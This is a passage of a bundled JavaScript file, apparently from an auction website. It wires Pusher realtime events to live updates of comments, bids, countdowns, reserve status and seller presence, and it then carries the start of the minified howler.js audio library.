(function ($, _) {
  try {
    // Object to hold callbacks
    BAT_WEBSERVICES_PUSHER.callbacks = {};

    // Connect to Pusher using the specified application key, ensuring that connections are encrypted
    BAT_WEBSERVICES_PUSHER.client = new Pusher(BAT_WEBSERVICES_PUSHER.key, BAT_WEBSERVICES_PUSHER.settings);

    // Utility function for binding to one or more channels for a specific event
    BAT_WEBSERVICES_PUSHER.bind = function (channelName, eventName, callback) {
      if (true === channelName) {
        // Bind globally which means that the event will be triggered for all subscribed channels
        BAT_WEBSERVICES_PUSHER.client.bind(eventName, callback);
      } else if ('undefined' !== typeof BAT_WEBSERVICES_PUSHER.client.channel(channelName)) {
        // Bind to a specific subscribed channel
        var channel = BAT_WEBSERVICES_PUSHER.client.channel(channelName);
        channel.bind(eventName, callback);
      }
    };

    // Utility function for subscribing to a channel by name, ensuring we don't double subscribe
    BAT_WEBSERVICES_PUSHER.subscribe = function (channelName) {
      if ('undefined' === typeof BAT_WEBSERVICES_PUSHER.client.channel(channelName)) {
        return BAT_WEBSERVICES_PUSHER.client.subscribe(channelName);
      }
    };
  } catch (exception) {
    BAT_WEBSERVICES_PUSHER.bind = function (channelName, eventName, callback) {
      console.log("CANNOT BIND - NO CLIENT CONNECTION");
    };
    BAT_WEBSERVICES_PUSHER.subscribe = function (channelName) {
      console.log("CANNOT SUBSCRIBE - NO CLIENT CONNECTION");
    };
  }
  $(document).ready(function () {
    BAT_WEBSERVICES_PUSHER.isFirstConnection = true;
    var statusMessageHandler = false;

    // Bind to state change events
    BAT_WEBSERVICES_PUSHER.client.connection.bind('state_change', function (states) {
      var newState = states.current;

      // Clear any queued status messages
      if (statusMessageHandler) {
        clearTimeout(statusMessageHandler);
        statusMessageHandler = false;
      }
      if ('connected' === newState && BAT_WEBSERVICES_PUSHER.isFirstConnection) {
        BAT_WEBSERVICES_PUSHER.isFirstConnection = false;
        jQuery('.pusher-connection-status').hide();
      } else if ('connected' === newState && !BAT_WEBSERVICES_PUSHER.isFirstConnection) {
        // Since this is not the first successful connection, assume a disconnection has occurred and refetch page data.
        // This also works when a page is restored from cache with an already-created JS heap.
        connectionRestored();
      } else {
        // Delay a few seconds before showing warning messages if connection is not established. Reduces page flickering
        // if data is quickly retrieved and warning during page refresh.
        statusMessageHandler = setTimeout(function () {
          jQuery('.pusher-connection-status').hide().filter('[data-status="' + newState + '"]').show();
          statusMessageHandler = false;
        }, 3000);
      }
    });

    // When a disconnect occurs (e.g. airplane mode), Pusher's connection state takes a few seconds to change.
    // Catch and display the disconnection message immediately, and disconnect Pusher.
    var isPusherForceDisconnected = false;
    jQuery(window).bind('offline', function () {
      jQuery('.pusher-connection-status').hide().filter('[data-status="disconnected"]').show();
      BAT_WEBSERVICES_PUSHER.client.connection.disconnect();
      isPusherForceDisconnected = true;
    });
    jQuery(window).bind('online', function () {
      if (isPusherForceDisconnected) {
        BAT_WEBSERVICES_PUSHER.client.connection.connect();
        isPusherForceDisconnected = false;
      }
    });
    var connectionRestored = function () {
      jQuery('.pusher-connection-status').hide().filter('[data-status="fetching"]').show();
      var CLVM = 'undefined' !== typeof BAT_VMS && 'undefined' !== typeof BAT_VMS.CLVM ? BAT_VMS.CLVM : false,
        comments = false !== CLVM ? CLVM.comments() : [],
        lastComment = 0 === comments.length ? 0 : comments[0].id();
      if (!CLVM) {
        // Not on a listing page, do not get missed comments
        return;
      }
      jQuery.post(BaT_Theme.ajaxUrl, {
        action: BAT_WEBSERVICES_PUSHER.ajaxActionListingMissedComments,
        listing_id: BaT_Theme.post,
        last_comment: lastComment
      }, function (data, status) {
        if (data.comments) {
          BAT_VMS.CLVM.slideInActive = false;
          jQuery.each(data.comments, function (index, comment) {
            if ('undefined' !== typeof comment.end_timestamp) {
              updateCountdowns(comment.post, comment.end_timestamp);
            }
            CLVM.addComment(comment, false);
          });
          BAT_VMS.CLVM.slideInActive = true;

          // Call this the same as if metadata was updated at any other point
          BAT_WEBSERVICES_PUSHER.callbacks.metadataUpdated(data.metadata);
        }
        jQuery('.pusher-connection-status').hide();
      }, 'json');
    };

    // Handle reconnecting to Pusher when loaded from bfcache
    window.addEventListener('pageshow', function (event) {
      var isWebSocketsSupported = 'WebSocket' in window && window.WebSocket.CLOSING === 2;
      if (event.persisted && isWebSocketsSupported && BAT_WEBSERVICES_PUSHER.client) {
        // Increment websocket transport lives, since loading a page from cache can count as a connection failure on mobile.
        // Reusing the same transport allows Pusher to reconnect using websockets instead of downgrading to a fallback transport.
        _.update(BAT_WEBSERVICES_PUSHER.client, 'connection.strategy.transports.ws.transport.manager.livesLeft', function (livesLeft) {
          return Math.max(livesLeft + 1, 3);
        });
      }
    });

    // For each element on the page that has a pusher data attribute, subscribe
    // to the channel indicated by that attribute
    $('[data-pusher]').each(function (index, element) {
      var channel = $(element).data('pusher').trim();
      BAT_WEBSERVICES_PUSHER.subscribe(channel);
    });
    var updateCountdowns = function (post_id, end_timestamp) {
      var theme = 'undefined' !== typeof BaT_Theme ? BaT_Theme : false;
      if (theme) {
        var ends = new Date(parseInt(end_timestamp) * 1000),
          now = new Date();
        if (ends > now) {
          var datetimem = moment(ends),
            formatted = datetimem.format('dddd, MMMM D [at] h:mma');
          $('[data-ends-id="' + post_id + '"]').text(formatted);
          var $countdowns = $('[data-countdown="' + post_id + '"],[data-auction-ends-id="' + post_id + '"],[data-recent_bid_auction_id="' + post_id + '"],[data-featured_listing="' + post_id + '"]');
          $countdowns.each(function (index, countdown) {
            var $countdown = $(countdown),
              _ends = $countdown.countdown('option', 'until');
            if (ends != _ends) {
              $countdown.countdown('option', 'until', ends).show();
              $countdown.data('processed_final', false).data('processed_second', false).data('processed', false);
              $countdown.siblings('.listing-end-processing-notice').hide();
            }
          });
          var $listingActionsReserve = $('.listing-actions-reserve');
          if ($listingActionsReserve.size()) {
            $.post(theme.ajaxUrl, {
              action: theme.ajaxActionListingReserveBox,
              listing: theme.post
            }, function (data, status) {
              if (data.reserve_met) {
                $('#listing-action-reserve-warn').remove();
              }

              // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
              $('.listing-actions-reserve').replaceWith(data.markup);
            });
          }
        }
      }
    };

    // Comment added or updated
    BAT_WEBSERVICES_PUSHER.bind(true, 'comment-added', function (data) {
      var CLVM = 'undefined' !== typeof BAT_VMS && 'undefined' !== typeof BAT_VMS.CLVM ? BAT_VMS.CLVM : false;
      if (CLVM && parseInt(data.comment.post) === parseInt(CLVM.id())) {
        // Auction has ended
        if ('bat-bid-reserve' === data.comment.type && data.comment.biddable_markup && data.comment.biddable_markup.available && data.comment.biddable_markup.box) {
          var $listingAvailable = $('.listing-available:first'),
            $listingBid = $('#listing-bid-container'),
            $listingAvailableNew = $(data.comment.biddable_markup.available),
            $listingBidNew = $(data.comment.biddable_markup.box),
            $contactSeller = $('#listing-essentials-item-contact'),
            $sellerContactWarn = $('#listing-action-contact-warn'),
            $sellerReserveWarn = $('#listing-action-reserve-warn'),
            $biddingRow = $('#listing-bid-row');

          // Remove the countdown, the label that points at it, and the separator - this is markup dependent
          $listingAvailable.find('[data-countdown]').countdown('destroy').parent().hide().prev().hide().prev().hide();
          $listingBid.find('[data-auction-ends-id]').countdown('destroy').parent().children().hide();
          $('.listing-available-progress-bar').remove();
          $('.listing-actions-reserve').remove();
          $sellerContactWarn.remove();
          $sellerReserveWarn.remove();
          $contactSeller.remove();
          var callback = function () {
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
            $listingAvailable.replaceWith($listingAvailableNew);
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
            $listingBid.replaceWith($listingBidNew);
          };
          $biddingRow.remove();
          if (data.comment.biddable_markup.sold_notice) {
            var $notice = $(data.comment.biddable_markup.sold_notice);

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
            $listingBid.find('table tbody').append($notice);
            setTimeout(function () {
              $notice.find('.listing-stats-label-centered').addClass('listing-stats-label-centered-show');
              setTimeout(function () {
                $notice.find('.listing-stats-label-centered').removeClass('listing-stats-label-centered-show');
                setTimeout(callback, 2000);
              }, 5000);
            }, 1);
          } else {
            callback();
          }
          var $listingActionsResults = $('#listing-actions-results-container');
          if ($listingActionsResults.size()) {
            var fetchListingResultsTries = 0;
            var fetchListingResults = function () {
              $.post(BaT_Theme.ajaxUrl, {
                action: BaT_Theme.ajaxActionListingResultsBox,
                listing: BaT_Theme.post
              }, function (data) {
                if (data.is_ended) {
                  // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
                  $('#listing-actions-results-container').replaceWith(data.markup);
                } else {
                  fetchListingResultsCaller();
                }
              });
            };
            var fetchListingResultsCaller = function () {
              if (fetchListingResultsTries < 5) {
                fetchListingResultsTries++;
                setTimeout(fetchListingResults, 2000);
              }
            };
            fetchListingResultsCaller();
          }
        }
        if ('undefined' !== typeof data.comment.end_timestamp) {
          updateCountdowns(data.comment.post, data.comment.end_timestamp);
        }
        CLVM.addComment(data.comment, true);
      }
    });

    // Comment deleted or moderated
    BAT_WEBSERVICES_PUSHER.bind(true, 'comment-deleted', function (data) {
      var CLVM = 'undefined' !== typeof BAT_VMS && 'undefined' !== typeof BAT_VMS.CLVM ? BAT_VMS.CLVM : false;
      if (CLVM) {
        CLVM.removeCommentById(data.comment_id);
      }
    });

    // Comment count updated for content item
    BAT_WEBSERVICES_PUSHER.bind(true, 'comments-updated', function (data) {
      if ('undefined' !== typeof BaT_Theme) {
        BaT_Theme.listingCardOnCommentsUpdated(data);
      }
      $('[data-realtime_id="' + data.content + '"][data-realtime_prop="comments-updated.display"]').text(data.display).parents('.post-meta-comments').toggleClass('post-meta-comments-hide', 0 === data.numeric);
      // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
      $('[data-realtime_id="' + data.content + '"][data-realtime_prop="comments-updated.header_html"]').html(data.header_html);
    });

    // Like count for a particular comment has been updated
    BAT_WEBSERVICES_PUSHER.bind(true, 'likes-updated-c', function (data) {
      var CLVM = 'undefined' !== typeof BAT_VMS && 'undefined' !== typeof BAT_VMS.CLVM ? BAT_VMS.CLVM : false;
      if (CLVM) {
        var comment = CLVM.getCommentById(data.comment_id);
        if (comment) {
          // Update the number of dislikes to hide comments as appropriate
          comment.dislikes(data.dislikes);

          // Update the number of likes for display
          comment.likes(data.numeric);

          // Update the users who have liked this comment to prevent double liking
          comment.likers(data.actors);

          // Update the comment markup if it is now nonConstructive
          if (comment.nonConstructive()) {
            comment.markup(data.markup);
          }
        }
      }
    });

    // Like count for a particular user has been updated
    BAT_WEBSERVICES_PUSHER.bind(true, 'likes-updated-u', function (data) {
      var CLVM = 'undefined' !== typeof BAT_VMS && 'undefined' !== typeof BAT_VMS.CLVM ? BAT_VMS.CLVM : false;
      if (CLVM) {
        var comments = CLVM.getCommentsByAuthor(data.user_id),
          index = 0;
        for (index = 0; index < comments.length; index++) {
          var comment = comments[index];
          comment.authorLikes(data.numeric);
        }
      }
    });

    // Get permission to push notifications for new listings
    if ('Notification' in window && BAT_WEBSERVICES_PUSHER.request_notifications) {
      if ('granted' !== Notification.permission && 'denied' !== Notification.permission) {
        Notification.requestPermission(function (permission) {
          if (!('permission' in Notification)) {
            Notification.permission = permission;
          }
        });
      }
    }

    // A new listing has been added
    BAT_WEBSERVICES_PUSHER.bind(true, 'listing-begin', function (data) {
      var listingLink = data.listing_link,
        listingImg = data.listing_img,
        listingType = BAT_WEBSERVICES_PUSHER.listing_begin_title,
        listingText = data.listing_text;
      if ('Notification' in window && BAT_WEBSERVICES_PUSHER.request_notifications) {
        if ('granted' === Notification.permission) {
          var notification = new Notification(listingType, {
            body: listingText,
            icon: listingImg
          });
          notification.onclick = event => {
            window.open(listingLink);
          };
        } else if ('denied' !== Notification.permission) {
          Notification.requestPermission(function (permission) {
            if (!('permission' in Notification)) {
              Notification.permission = permission;
            }
            if ('granted' === permission) {
              var notification = new Notification(listingType, {
                body: listingText,
                icon: listingImg
              });
            }
          });
        }
      }
    });

    // A new bid has been completed by a user
    BAT_WEBSERVICES_PUSHER.bind(true, 'completed-bid', function (data) {
      var theme = 'undefined' !== typeof BaT_Theme ? BaT_Theme : false;
      if (theme) {
        $('.recent-bids-list-item').removeClass('recent-bids-list-item-active');
        theme.addBid(data);
      }
    });

    // Store the callback for metadata updated
    BAT_WEBSERVICES_PUSHER.callbacks.metadataUpdated = function (data) {
      var theme = 'undefined' !== typeof BaT_Theme ? BaT_Theme : false;
      if (theme) {
        //FIXME Clean this up at some point
        if (data.withdrawn) {
          $('[data-listing-bid-id="' + data.post_id + '"] #listing-bid').parent().remove();
          $('[data-listing-intro-id="' + data.post_id + '"]').find('.listing-available-countdown').countdown('destroy');
          $('[data-listing-intro-id="' + data.post_id + '"]')
          // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
          .find('.listing-available-actions').empty().append($(data.listing_available_actions)).end()
          // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
          .find('.listing-available-info').empty().append($(data.listing_available_info)).end();
          $('.listing-actions-reserve').remove();
        }
        theme.listingCardOnMetadataUpdated(data);
        $('[data-listing-button="' + data.post_id + '"]').text(data.button_text);
        $('[data-listing-count="' + data.post_id + '"]').text(data.count_text);
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
        $('[data-listing-current="' + data.post_id + '"]').html(data.current_text_bold);
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
        $('.current-auctions.group [data-listing-current="' + data.post_id + '"]').html(data.current_text);
        $('[data-listing-current-bidding="' + data.post_id + '"]').data('amount', data.current_numeric);
        $('[data-listing-current-bidding="' + data.post_id + '"]').data('high-bidder', data.high_bidder_id);
        $('[data-listing-current-bidding="' + data.post_id + '"]').data('minimum', data.minimum_bid_numeric);
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
        $('[data-listing-current-expanded="' + data.post_id + '"]').html(data.current_text_expanded);
        $('[data-listing-current-plain="' + data.post_id + '"]').text(data.current_text_plain);
        $('[data-listing-current-home="' + data.post_id + '"]').text(data.current_text_home);
        $('[data-listing-current-home-label="' + data.post_id + '"]').text(data.current_text_home_label);
        $('[data-listing-minimum="' + data.post_id + '"]').attr('placeholder', data.minimum_text);

        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
        $('[data-listing-high-bidder-link="' + data.post_id + '"]').html(data.high_bidder_link);

        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
        $('[data-listing-currently="' + data.post_id + '"]').replaceWith(data.currently);

        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
        $('.comments_header_html').html(data.comments_header_html);
        var $table = $('#listing-bid[data-listing-bid-id="' + data.post_id + '"]');
        if ($table.length > 0) {
          $current_bid_row = $table.find('#current-bid-row');
          if ('' === data.current_bid_row && $current_bid_row.length > 0) {
            $current_bid_row.remove();
          } else if ('' !== data.current_bid_row && 0 === $current_bid_row.length) {
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.prepend -- HTML is properly escaped.
            $table.prepend(data.current_bid_row);
          }
        }
      }
    };

    // Metadata for a listing has been updated
    BAT_WEBSERVICES_PUSHER.bind(true, 'metadata-updated', BAT_WEBSERVICES_PUSHER.callbacks.metadataUpdated);
    BAT_WEBSERVICES_PUSHER.bind(true, 'reserve-updated', function (data) {
      var theme = 'undefined' !== typeof BaT_Theme ? BaT_Theme : false;
      if (theme) {
        var $listingActionsReserve = $('.listing-actions-reserve');
        if ($listingActionsReserve.length > 0) {
          $.post(theme.ajaxUrl, {
            action: theme.ajaxActionListingReserveBox,
            listing: data.item_id
          }, function (data, status) {
            if (data.reserve_met) {
              $('#listing-action-reserve-warn').remove();
            }

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
            $('.listing-actions-reserve').replaceWith(data.markup);
          });
        }
      }
    });
    BAT_WEBSERVICES_PUSHER.bind(true, 'metadata-updated', function (data) {
      $('[data-update="' + data.post_id + '"]').data('price', data.current_numeric);
    });
    BAT_WEBSERVICES_PUSHER.bind(true, 'moderate-comments-message-updated', function (data) {
      // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
      $('.comments-warning-container-comments-moderation[data-item="' + data.post_id + '"]').html(data.message);
    });

    // Ending timestamp for a listing has been updated
    BAT_WEBSERVICES_PUSHER.bind(true, 'endtime-updated', function (data) {
      $('[data-update="' + data.post_id + '"]').data('timestamp', data.end_timestamp);
      updateCountdowns(data.post_id, data.end_timestamp);
    });
    BAT_WEBSERVICES_PUSHER.bind(true, 'stats-updated', function (data) {
      if ('undefined' !== typeof BaT_Theme) {
        BaT_Theme.listingCardOnStatsUpdated(data);
      }
      if ('undefined' !== typeof data.views) {
        $('[data-stats-id="' + data.post_id + '"][data-stats-item="views"]').text(data.views);
      }
      if ('undefined' !== typeof data.watchers) {
        $('[data-stats-id="' + data.post_id + '"][data-stats-item="watchers"]').text(data.watchers);
      }
      if ('undefined' !== typeof data.watchers_noun) {
        $('[data-stats-id="' + data.post_id + '"][data-stats-item="watchers_noun"]').text(data.watchers_noun);
      }
      if ('undefined' !== typeof data.watchers_number) {
        $('[data-stats-id="' + data.post_id + '"][data-stats-item="watchers_number"]').text(data.watchers_number);
      }
    });
    BAT_WEBSERVICES_PUSHER.bind(true, 'votes-updated', function (data) {
      if ('undefined' !== typeof data.item_id && 'undefined' !== typeof data.votes) {
        $('[data-votes-id="' + data.item_id + '"][data-votes-item="votes"]').text(data.votes);
      }
      if ('undefined' !== typeof data.item_id && 'undefined' !== typeof window.galleryItems) {
        for (var i = 0; i < window.galleryItems.length; i++) {
          var item = window.galleryItems[i];
          if (item.id == data.item_id) {
            item.votes = data.votes;
          }
        }
      }
    });

    // Notify System of seller presence
    BAT_WEBSERVICES_PUSHER.bind('presence-seller-check', 'pusher:subscription_succeeded', function (members) {
      members.each(function (member) {
        if (parseInt(member.info.post_id) == parseInt(BaT_Theme.post) && parseInt(BAT_VMS.postAuthor) == parseInt(member.id)) {
          $.post(BaT_Theme.ajaxUrl, {
            action: BAT_WEBSERVICES_PUSHER.ajaxActionListingSellerPresence,
            listing_id: BaT_Theme.post,
            user_id: BAT_VMS.postAuthor
          }, function (data, status) {
            $('.postid-' + BaT_Theme.post + ' #seller_last_present').text(BAT_WEBSERVICES_PUSHER.seller_online_title);
          });
        }
      });
    });
    BAT_WEBSERVICES_PUSHER.bind('presence-seller-check', 'pusher:member_added', function (member) {
      if (parseInt(member.info.post_id) == parseInt(BaT_Theme.post) && parseInt(BAT_VMS.postAuthor) == parseInt(member.id)) {
        $.post(BaT_Theme.ajaxUrl, {
          action: BAT_WEBSERVICES_PUSHER.ajaxActionListingSellerPresence,
          listing_id: BaT_Theme.post,
          user_id: BAT_VMS.postAuthor
        }, function (data, status) {
          $('.postid-' + BaT_Theme.post + ' #seller_last_present').text(BAT_WEBSERVICES_PUSHER.seller_online_title);
        });
      }
    });
    BAT_WEBSERVICES_PUSHER.bind('presence-seller-check', 'pusher:member_removed', function (member) {
      if (parseInt(member.info.post_id) == parseInt(BaT_Theme.post) && parseInt(BAT_VMS.postAuthor) == parseInt(member.id)) {
        $.post(BaT_Theme.ajaxUrl, {
          action: BAT_WEBSERVICES_PUSHER.ajaxActionListingSellerPresence,
          listing_id: BaT_Theme.post,
          user_id: BAT_VMS.postAuthor
        }, function (data, status) {
          $('.postid-' + BaT_Theme.post + ' #seller_last_present').text(data.date_current);
        });
      }
    });
  });
})(jQuery, lodash);
;
/*! howler.js v2.1.2 | (c) 2013-2019, James Simpson of GoldFire Studios | MIT License | howlerjs.com */
!function () {
  "use strict";

  var e = function () {
    this.init();
  };
  e.prototype = {
    init: function () {
      var e = this || n;
      return e._counter = 1e3, e._html5AudioPool = [], e.html5PoolSize = 10, e._codecs = {}, e._howls = [], e._muted = !1, e._volume = 1, e._canPlayEvent = "canplaythrough", e._navigator = "undefined" != typeof window && window.navigator ? window.navigator : null, e.masterGain = null, e.noAudio = !1, e.usingWebAudio = !0, e.autoSuspend = !0, e.ctx = null, e.autoUnlock = !0, e._setup(), e;
    },
    volume: function (e) {
      var o = this || n;
      if (e = parseFloat(e), o.ctx || _(), void 0 !== e && e >= 0 && e <= 1) {
        if (o._volume = e, o._muted) return o;
        o.usingWebAudio && o.masterGain.gain.setValueAtTime(e, n.ctx.currentTime);
        for (var t = 0; t < o._howls.length; t++) if (!o._howls[t]._webAudio) for (var r = o._howls[t]._getSoundIds(), a = 0; a < r.length; a++) {
          var u = o._howls[t]._soundById(r[a]);
          u && u._node && (u._node.volume = u._volume * e);
        }
        return o;
      }
      return o._volume;
    },
    mute: function (e) {
      var o = this || n;
      o.ctx || _(), o._muted = e, o.usingWebAudio && o.masterGain.gain.setValueAtTime(e ? 0 : o._volume, n.ctx.currentTime);
      for (var t = 0; t < o._howls.length; t++) if (!o._howls[t]._webAudio) for (var r = o._howls[t]._getSoundIds(), a = 0; a < r.length; a++) {
        var u = o._howls[t]._soundById(r[a]);
        u && u._node && (u._node.muted = !!e || u._muted);
      }
      return o;
    },
    unload: function () {
      for (var e = this || n, o = e._howls.length - 1; o >= 0; o--) e._howls[o].unload();
      return e.usingWebAudio && e.ctx && void 0 !== e.ctx.close && (e.ctx.close(), e.ctx = null, _()), e;
    },
    codecs: function (e) {
      return (this || n)._codecs[e.replace(/^x-/, "")];
    },
    _setup: function () {
      var e = this || n;
      if (e.state = e.ctx ? e.ctx.state || "suspended" : "suspended", e._autoSuspend(), !e.usingWebAudio) if ("undefined" != typeof Audio) try {
        var o = new Audio();
        void 0 === o.oncanplaythrough && (e._canPlayEvent = "canplay");
      } catch (n) {
        e.noAudio = !0;
      } else e.noAudio = !0;
      try {
        var o = new Audio();
        o.muted && (e.noAudio = !0);
      } catch (e) {}
      return e.noAudio || e._setupCodecs(), e;
    },
    _setupCodecs: function () {
      var e = this || n,
        o = null;
      try {
        o = "undefined" != typeof Audio ? new Audio() : null;
      } catch (n) {
        return e;
      }
      if (!o || "function" != typeof o.canPlayType) return e;
      var t = o.canPlayType("audio/mpeg;").replace(/^no$/, ""),
        r = e._navigator && e._navigator.userAgent.match(/OPR\/([0-6].)/g),
        a = r && parseInt(r[0].split("/")[1], 10) < 33;
      return e._codecs = {
        mp3: !(a || !t && !o.canPlayType("audio/mp3;").replace(/^no$/, "")),
        mpeg: !!t,
        opus: !!o.canPlayType('audio/ogg; codecs="opus"').replace(/^no$/, ""),
        ogg: !!o.canPlayType('audio/ogg; codecs="vorbis"').replace(/^no$/, ""),
        oga: !!o.canPlayType('audio/ogg; codecs="vorbis"').replace(/^no$/, ""),
        wav: !!o.canPlayType('audio/wav; codecs="1"').replace(/^no$/, ""),
        aac: !!o.canPlayType("audio/aac;").replace(/^no$/, ""),
        caf: !!o.canPlayType("audio/x-caf;").replace(/^no$/, ""),
        m4a: !!(o.canPlayType("audio/x-m4a;") || o.canPlayType("audio/m4a;") || o.canPlayType("audio/aac;")).replace(/^no$/, ""),
        mp4: !!(o.canPlayType("audio/x-mp4;") || o.canPlayType("audio/mp4;") || o.canPlayType("audio/aac;")).replace(/^no$/, ""),
        weba: !!o.canPlayType('audio/webm; codecs="vorbis"').replace(/^no$/, ""),
        webm: !!o.canPlayType('audio/webm; codecs="vorbis"').replace(/^no$/, ""),
        dolby: !!o.canPlayType('audio/mp4; codecs="ec-3"').replace(/^no$/, ""),
        flac: !!(o.canPlayType("audio/x-flac;") || o.canPlayType("audio/flac;")).replace(/^no$/, "")
      }, e;
    },
    _unlockAudio: function () {
      var e = this || n;
      if (!e._audioUnlocked && e.ctx) {
        e._audioUnlocked = !1, e.autoUnlock = !1, e._mobileUnloaded || 44100 === e.ctx.sampleRate || (e._mobileUnloaded = !0, e.unload()), e._scratchBuffer = e.ctx.createBuffer(1, 1, 22050);
        var o = function (n) {
          for (var t = 0; t < e.html5PoolSize; t++) try {
            var r = new Audio();
            r._unlocked = !0, e._releaseHtml5Audio(r);
          } catch (n) {
            e.noAudio = !0;
          }
          for (var t = 0; t < e._howls.length; t++) if (!e._howls[t]._webAudio) for (var a = e._howls[t]._getSoundIds(), u = 0; u < a.length; u++) {
            var i = e._howls[t]._soundById(a[u]);
            i && i._node && !i._node._unlocked && (i._node._unlocked = !0, i._node.load());
          }
          e._autoResume();
          var d = e.ctx.createBufferSource();
          d.buffer = e._scratchBuffer, d.connect(e.ctx.destination), void 0 === d.start ? d.noteOn(0) : d.start(0), "function" == typeof e.ctx.resume && e.ctx.resume(), d.onended = function () {
            d.disconnect(0), e._audioUnlocked = !0, document.removeEventListener("touchstart", o, !0), document.removeEventListener("touchend", o, !0), document.removeEventListener("click", o, !0);
            for (var n = 0; n < e._howls.length; n++) e._howls[n]._emit("unlock");
          };
        };
        return document.addEventListener("touchstart", o, !0), document.addEventListener("touchend", o, !0), document.addEventListener("click", o, !0), e;
      }
    },
    _obtainHtml5Audio: function () {
      var e = this || n;
      if (e._html5AudioPool.length) return e._html5AudioPool.pop();
      var o = new Audio().play();
      return o && "undefined" != typeof Promise && (o instanceof Promise || "function" == typeof o.then) && o.catch(function () {
        console.warn("HTML5 Audio pool exhausted, returning potentially locked audio object.");
      }), new Audio();
    },
    _releaseHtml5Audio: function (e) {
      var o = this || n;
      return e._unlocked && o._html5AudioPool.push(e), o;
    },
    _autoSuspend: function () {
      var e = this;
      if (e.autoSuspend && e.ctx && void 0 !== e.ctx.suspend && n.usingWebAudio) {
        for (var o = 0; o < e._howls.length; o++) if (e._howls[o]._webAudio) for (var t = 0; t < e._howls[o]._sounds.length; t++) if (!e._howls[o]._sounds[t]._paused) return e;
        return e._suspendTimer && clearTimeout(e._suspendTimer), e._suspendTimer = setTimeout(function () {
          e.autoSuspend && (e._suspendTimer = null, e.state = "suspending", e.ctx.suspend().then(function () {
            e.state = "suspended", e._resumeAfterSuspend && (delete e._resumeAfterSuspend, e._autoResume());
          }));
        }, 3e4), e;
      }
    },
    _autoResume: function () {
      var e = this;
      if (e.ctx && void 0 !== e.ctx.resume && n.usingWebAudio) return "running" === e.state && e._suspendTimer ? (clearTimeout(e._suspendTimer), e._suspendTimer = null) : "suspended" === e.state ? (e.ctx.resume().then(function () {
        e.state = "running";
        for (var n = 0; n < e._howls.length; n++) e._howls[n]._emit("resume");
      }), e._suspendTimer && (clearTimeout(e._suspendTimer), e._suspendTimer = null)) : "suspending" === e.state && (e._resumeAfterSuspend = !0), e;
    }
  };
  var n = new e(),
    o = function (e) {
      var n = this;
      if (!e.src || 0 === e.src.length) return void console.error("An array of source files must be passed with any new Howl.");
      n.init(e);
    };
  o.prototype = {
    init: function (e) {
      var o = this;
      return n.ctx || _(), o._autoplay = e.autoplay || !1, o._format = "string" != typeof e.format ? e.format : [e.format], o._html5 = e.html5 || !1, o._muted = e.mute || !1, o._loop = e.loop || !1, o._pool = e.pool || 5, o._preload = "boolean" != typeof e.preload || e.preload, o._rate = e.rate || 1, o._sprite = e.sprite || {}, o._src = "string" != typeof e.src ? e.src : [e.src], o._volume = void 0 !== e.volume ? e.volume : 1, o._xhrWithCredentials = e.xhrWithCredentials || !1, o._duration = 0, o._state = "unloaded", o._sounds = [], o._endTimers = {}, o._queue = [], o._playLock = !1, o._onend = e.onend ? [{
        fn: e.onend
      }] : [], o._onfade = e.onfade ? [{
        fn: e.onfade
      }] : [], o._onload = e.onload ? [{
        fn: e.onload
      }] : [], o._onloaderror = e.onloaderror ? [{
        fn: e.onloaderror
      }] : [], o._onplayerror = e.onplayerror ? [{
        fn: e.onplayerror
      }] : [], o._onpause = e.onpause ? [{
        fn: e.onpause
      }] : [], o._onplay = e.onplay ? [{
        fn: e.onplay
      }] : [], o._onstop = e.onstop ? [{
        fn: e.onstop
      }] : [], o._onmute = e.onmute ? [{
        fn: e.onmute
      }] : [], o._onvolume = e.onvolume ? [{
        fn: e.onvolume
      }] : [], o._onrate = e.onrate ? [{
        fn: e.onrate
      }] : [], o._onseek = e.onseek ? [{
        fn: e.onseek
      }] : [], o._onunlock = e.onunlock ? [{
        fn: e.onunlock
      }] : [], o._onresume = [], o._webAudio = n.usingWebAudio && !o._html5, void 0 !== n.ctx && n.ctx && n.autoUnlock && n._unlockAudio(), n._howls.push(o), o._autoplay && o._queue.push({
        event: "play",
        action: function () {
          o.play();
        }
      }), o._preload && o.load(), o;
    },
    load: function () {
      var e = this,
        o = null;
      if (n.noAudio) return void e._emit("loaderror", null, "No audio support.");
      "string" == typeof e._src && (e._src = [e._src]);
      for (var r = 0; r < e._src.length; r++) {
        var u, i;
        if (e._format && e._format[r]) u = e._format[r];else {
          if ("string" != typeof (i = e._src[r])) {
            e._emit("loaderror", null, "Non-string found in selected audio sources - ignoring.");
            continue;
          }
          u = /^data:audio\/([^;,]+);/i.exec(i), u || (u = /\.([^.]+)$/.exec(i.split("?", 1)[0])), u && (u = u[1].toLowerCase());
        }
        if (u || console.warn('No file extension was found. Consider using the "format" property or specify an extension.'), u && n.codecs(u)) {
          o = e._src[r];
          break;
        }
      }
